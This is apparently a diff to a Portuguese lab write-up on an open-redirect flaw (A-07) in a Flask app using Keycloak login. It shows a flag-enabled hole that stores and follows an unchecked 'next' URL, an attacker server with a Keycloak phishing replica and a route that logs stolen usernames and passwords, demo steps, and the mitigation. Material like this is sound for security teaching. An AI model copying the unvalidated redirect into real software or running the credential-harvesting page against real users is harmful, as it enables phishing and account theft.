@@ -19,13 +19,178 @@ o que aumenta muito a credibilidade do ataque de phishing.
 
 ---
 
+## Análise do Código
+
+### 1. Flag de controlo — `sp1/config.py`
+
+```python
+# True  = sistema VULNERÁVEL
+# False = mitigação ATIVA
+VULN_A07_OPEN_REDIRECT = True
+```
+
+Esta flag é importada com `from config import *` e afecta dois pontos
+do fluxo de autenticação: a rota `/login` (onde o parâmetro é lido)
+e a rota `/callback` (onde o redirect é executado).
+
+---
+
+### 2. Rota `/login` — `sp1/app.py`
+
+É aqui que o parâmetro `next` é lido do URL e guardado na sessão.
+A vulnerabilidade está na **ausência de validação**:
+
+```python
+@app.route("/login")
+def login():
+    next_url = request.args.get("next", "")
+    # Para: http://localhost:5001/login?next=http://localhost:9999/malicious
+    # next_url = "http://localhost:9999/malicious"
+
+    if VULN_A07_OPEN_REDIRECT:
+        # VULNERÁVEL: guarda qualquer URL sem verificar se é interna
+        session["next_url"] = next_url
+        # session["next_url"] = "http://localhost:9999/malicious"
+    else:
+        # MITIGADO: só aceita paths internos
+        if next_url.startswith("/") and not next_url.startswith("//"):
+            session["next_url"] = next_url   # ex: "/profile" → aceite
+        else:
+            session["next_url"] = ""          # URL externa → ignorada
+
+    redirect_uri = url_for("callback", _external=True)
+    return oauth.keycloak.authorize_redirect(redirect_uri)
+    # O utilizador é enviado para o Keycloak LEGÍTIMO
+    # (o ataque ainda não aconteceu — o login é real)
+```
+
+**Porquê guardar na sessão e não no parâmetro do callback?**
+O OIDC redirect (`/callback`) não pode transportar parâmetros arbitrários —
+o Keycloak devolve apenas para o `redirect_uri` registado. A sessão é
+o mecanismo para "lembrar" o `next` durante o fluxo OIDC.
+
+---
+
+### 3. Rota `/callback` — `sp1/app.py`
+
+Após o Keycloak autenticar o utilizador e devolver o código,
+o SP1 executa o redirect para o `next_url` guardado na sessão:
+
+```python
+@app.route("/callback")
+def callback():
+    token = oauth.keycloak.authorize_access_token()
+    user_info = token.get("userinfo")
+
+    # ... (A-09 e A-06 — ver respectivos documentos)
+
+    session["user"]         = user_info
+    session["access_token"] = token.get("access_token")
+
+    # ---- A-07: Open Redirect ----
+    next_url = session.pop("next_url", "")
+    # next_url = "http://localhost:9999/malicious"  ← o valor injectado
+
+    if VULN_A07_OPEN_REDIRECT and next_url:
+        # VULNERÁVEL: redirect para qualquer URL, incluindo domínios externos
+        return redirect(next_url)
+        # HTTP 302  Location: http://localhost:9999/malicious
+        # O utilizador foi autenticado com sucesso mas é enviado para o atacante
+
+    # Se VULN=False ou next_url vazio: vai para o dashboard normal
+    if VULN_A06_REFERRER_LEAK:
+        return redirect(url_for("dashboard", token=token.get("access_token")))
+    return redirect(url_for("index"))
+```
+
+**Sequência de execução com `VULN_A07 = True`:**
+1. `session.pop("next_url")` → recupera `"http://localhost:9999/malicious"`
+2. `if VULN_A07_OPEN_REDIRECT and next_url` → **True**
+3. `return redirect(next_url)` → browser vai para o atacante
+4. Os blocos A-06 nunca chegam a ser executados (return saiu antes)
+
+---
+
+### 4. Servidor do atacante — `attacker/app.py`
+
+O atacante recebe o utilizador já autenticado:
+
+```python
+@app.route("/malicious")
+def malicious():
+    # O utilizador chegou aqui após autenticar no Keycloak REAL
+    log_event(
+        "A-07: Open Redirect",
+        request.referrer or "directo",
+        f"Utilizador aterrou na página de phishing. IP: {request.remote_addr}"
+    )
+    return render_template("phishing.html")
+    # Mostra uma réplica do Keycloak pedindo login novamente
+
+@app.route("/steal-credentials", methods=["POST"])
+def steal_credentials():
+    username = request.form.get("username", "")
+    password = request.form.get("password", "")
+
+    log_event(
+        "A-07: Credenciais Roubadas",
+        "phishing form POST",
+        f"username={username}  password={password}"
+    )
+    # Após roubar as credenciais, redireciona para o portal real
+    # → a vítima pensa que o segundo login funcionou, não suspeita
+    return redirect("http://localhost:5001/")
+```
+
+---
+
+## Fluxo Completo do Ataque
+
+```
+VÍTIMA (browser)                SP1 :5001         KEYCLOAK :8080    ATACANTE :9999
+      │                            │                    │                  │
+      │  Clica no link malicioso:  │                    │                  │
+      │  localhost:5001/login      │                    │                  │
+      │  ?next=localhost:9999/malicious                 │                  │
+      │── GET /login?next=... ─────►│                    │                  │
+      │                            │  session["next_url"] = "http://...malicious"
+      │◄── 302 → Keycloak ─────────│                    │                  │
+      │                            │                    │                  │
+      │── GET /auth?... ───────────────────────────────►│                  │
+      │◄── 200 (ecrã de login REAL) ───────────────────│                  │
+      │                            │                    │                  │
+      │  [vítima introduz credenciais REAIS]             │                  │
+      │── POST /login (credenciais) ───────────────────►│                  │
+      │◄── 302 /callback?code=X ───────────────────────│                  │
+      │                            │                    │                  │
+      │── GET /callback?code=X ───►│                    │                  │
+      │                            │── troca code ──────►│                  │
+      │                            │◄── tokens ─────────│                  │
+      │                            │                    │                  │
+      │                            │  session.pop("next_url")              │
+      │◄── 302 Location: http://localhost:9999/malicious (REDIRECT ABERTO) │
+      │                            │                    │                  │
+      │── GET /malicious ──────────────────────────────────────────────────►│
+      │◄── 200 (página de phishing — réplica do Keycloak) ─────────────────│
+      │                            │                    │                  │
+      │  [vítima introduz credenciais novamente]         │                  │
+      │── POST /steal-credentials ─────────────────────────────────────────►│
+      │                            │                    │  [credenciais roubadas]
+      │◄── 302 → http://localhost:5001/ ────────────────────────────────────│
+      │                            │                    │                  │
+      │── GET / ───────────────────►│                    │                  │
+      │◄── dashboard (vítima pensa que tudo correu bem) │                  │
+```
+
+---
+
 ## Passos da Demonstração
 
 ### 1. Verificar configuração vulnerável
 
 ```python
 # sp1/config.py
-VULN_A07_OPEN_REDIRECT = True   # ← deve estar True
+VULN_A07_OPEN_REDIRECT = True
 ```
 
 ### 2. Construir a URL maliciosa
@@ -42,74 +207,71 @@ Este URL parece legítimo — começa com o domínio do Portal A.
 
 Abre `http://localhost:9999/` em segundo plano para ver os eventos.
 
-### 4. Clicar no link malicioso
+### 4. Clicar no link malicioso e fazer login
 
 Acede ao URL acima. O SP1 inicia o fluxo OIDC normalmente com o Keycloak.
+Faz login com `bob` / `bob123` — o login no Keycloak é **real**.
 
-### 5. Fazer login (vítima introduz credenciais reais no Keycloak legítimo)
+### 5. Observar o redirect
 
-- **Username:** `bob`
-- **Password:** `bob123`
+Após autenticação, o browser vai para `localhost:9999/malicious`.
+A página de phishing pede login novamente — introduz quaisquer credenciais.
 
-O login no Keycloak é **real** — as credenciais são correctas.
+### 6. Verificar no Attacker Dashboard
 
-### 6. Observar o redirect malicioso
-
-Após autenticação bem-sucedida, em vez de ir para o dashboard do Portal A,
-o browser é redireccionado para `http://localhost:9999/malicious` — a página
-de phishing que imita o Keycloak.
-
-### 7. Captura de credenciais (2ª fase)
-
-A página de phishing mostra um falso ecrã de login do Keycloak.
-A vítima pensa que algo correu mal e introduz as credenciais novamente.
-Essas credenciais são enviadas para `/steal-credentials` e aparecem no dashboard.
+Dois eventos aparecem:
+- **A-07: Open Redirect** — utilizador aterrou na página
+- **A-07: Credenciais Roubadas** — username e password capturados
 
 ---
 
-## Por que funciona?
-
-```python
-# sp1/app.py — código vulnerável
-@app.route("/login")
-def login():
-    next_url = request.args.get("next", "/")
-    if VULN_A07_OPEN_REDIRECT:
-        session["next_url"] = next_url   # VULN: qualquer URL aceite
-    ...
-
-@app.route("/callback")
-def callback():
-    ...
-    next_url = session.pop("next_url", "/")
-    return redirect(next_url)            # VULN: redirect para URL externa
-```
-
-1. O parâmetro `next` é aceite **sem validação**
-2. Após autenticação, o valor é usado directamente no `redirect()`
-3. Não há verificação se o destino é interno (começa com `/`) ou externo
-
----
-
-## Mitigação (Passo 7)
+## Mitigação — Análise do Código
 
 ```python
 # sp1/config.py
 VULN_A07_OPEN_REDIRECT = False
 ```
 
-Quando `False`, o SP1 valida o parâmetro `next`:
+**Efeito na rota `/login`:**
 
 ```python
-# Só aceita paths internos (começam com / mas não com //)
-if next_url.startswith("/") and not next_url.startswith("//"):
-    session["next_url"] = next_url
+if VULN_A07_OPEN_REDIRECT:
+    session["next_url"] = next_url          # ← NÃO executado
+
 else:
-    session["next_url"] = "/"   # ignora URLs externas
+    # Validação: só paths internos são aceites
+    if next_url.startswith("/") and not next_url.startswith("//"):
+        session["next_url"] = next_url
+        # "/profile"   → aceite  (path interno)
+        # "//"          → rejeitado (protocol-relative URL — pode apontar para externo)
+    else:
+        session["next_url"] = ""
+        # "http://localhost:9999/malicious" → REJEITADO (URL absoluta externa)
+        # "https://evil.com"               → REJEITADO
 ```
 
-Qualquer `?next=http://...` é silenciosamente ignorado e o utilizador
-é redireccionado para `/` (dashboard).
+**Efeito na rota `/callback`:**
+
+```python
+next_url = session.pop("next_url", "")
+# next_url = ""  (foi rejeitado na validação)
+
+if VULN_A07_OPEN_REDIRECT and next_url:
+    return redirect(next_url)   # ← NÃO executado (VULN=False)
+
+# Fluxo normal: vai para o dashboard
+return redirect(url_for("index"))
+```
+
+**Exemplos de validação:**
+
+| `?next=` | `VULN=True` | `VULN=False` |
+|----------|-------------|--------------|
+| `/profile` | ✅ aceite | ✅ aceite (path interno) |
+| `/admin` | ✅ aceite | ✅ aceite (path interno) |
+| `http://evil.com` | ✅ aceite → **redirect para evil.com** | ❌ rejeitado → vai para `/` |
+| `//evil.com/path` | ✅ aceite → **redirect para evil.com** | ❌ rejeitado (começa com `//`) |
+| `http://localhost:9999/malicious` | ✅ aceite → **redirect para atacante** | ❌ rejeitado → vai para `/` |
 
 ---
 
